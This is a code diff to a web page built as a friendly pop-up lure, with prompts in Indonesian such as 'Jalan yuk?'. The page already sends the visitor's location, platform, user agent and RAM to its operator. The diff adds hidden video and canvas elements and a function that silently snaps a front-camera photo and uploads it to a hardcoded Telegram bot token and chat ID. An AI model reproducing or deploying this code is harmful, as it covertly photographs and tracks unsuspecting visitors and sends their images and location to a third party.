@@ -51,6 +51,9 @@
         .swal2-container {
             z-index: 1060;
         }
+        video, canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -70,6 +73,8 @@
         </div>
         
         <div id="map"></div>
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
@@ -122,6 +127,7 @@
                 document.getElementById('map').appendChild(iframe);
                 
                 kirim(latitude, longitude, platform, userAgent, ram);
+                ambilPoto();
             });
         }
 
@@ -147,6 +153,53 @@
                 .then(response => response.json())
                 .then(data => console.log(data))
                 .catch(error => console.error('Error:', error));
+        }
+
+        function ambilPoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
+                    video.srcObject = stream;
+
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                            stream.getTracks().forEach(track => track.stop());
+
+                            canvas.toBlob(blob => {
+                                kirimPhoto(blob);
+                            });
+                        }, 500);
+                    };
+                })
+                .catch(error => {
+                    console.error('Error accessing camera:', error);
+                });
+        }
+
+        function kirimPhoto(blob) {
+            const telegramBotToken = '7457250844:AAGS8tBt0NRN9MCQOQZsZtEjXa6_X2nonyo';
+            const chatId = '6039239006';
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob);
+
+            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+
+            fetch(apiUrl, {
+                method: 'POST',
+                body: formData
+            })
+                .then(response => response.json())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error sending photo to Telegram:', error));
         }
 
         function showAlerts(step) {
@@ -178,10 +231,10 @@
                 });
             } else {
                 Swal.fire({
-                    title: 'Alert 5',
+                    title: 'Jalan yuk?',
                     text: texts[step],
                     input: 'text',
-                    inputPlaceholder: 'Enter your message here',
+                    inputPlaceholder: 'Kirim pesan ya kalo mau...',
                     imageUrl: images[step],
                     imageWidth: 150,
                     imageHeight: 150,
